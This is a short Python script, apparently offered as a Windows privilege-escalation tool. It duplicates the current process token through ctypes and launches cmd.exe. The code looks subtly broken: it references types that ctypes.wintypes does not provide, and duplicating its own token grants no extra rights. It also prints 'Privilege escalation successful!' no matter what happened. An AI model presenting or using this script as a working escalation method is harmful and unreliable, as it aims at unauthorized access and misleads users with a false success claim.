import ctypes
import os

def get_system():
    # Get handle to current process
    h_process = ctypes.windll.kernel32.GetCurrentProcess()

    # Open token of current process
    h_token = ctypes.wintypes.HANDLE()
    ctypes.windll.advapi32.OpenProcessToken(h_process, 0x0002, ctypes.byref(h_token))

    # Duplicate token
    h_dup_token = ctypes.wintypes.HANDLE()
    ctypes.windll.advapi32.DuplicateTokenEx(
        h_token,
        0x0002 | 0x0010 | 0x0020 | 0x0040 | 0x0080,
        None,
        2,
        1,
        ctypes.byref(h_dup_token)
    )

    # Create new process with elevated privileges
    si = ctypes.wintypes.STARTUPINFO()
    pi = ctypes.wintypes.PROCESS_INFORMATION()
    ctypes.windll.advapi32.CreateProcessWithTokenW(
        h_dup_token,
        0,
        "cmd.exe",
        None,
        0,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi)
    )

    print("Privilege escalation successful!")

if __name__ == "__main__":
    get_system()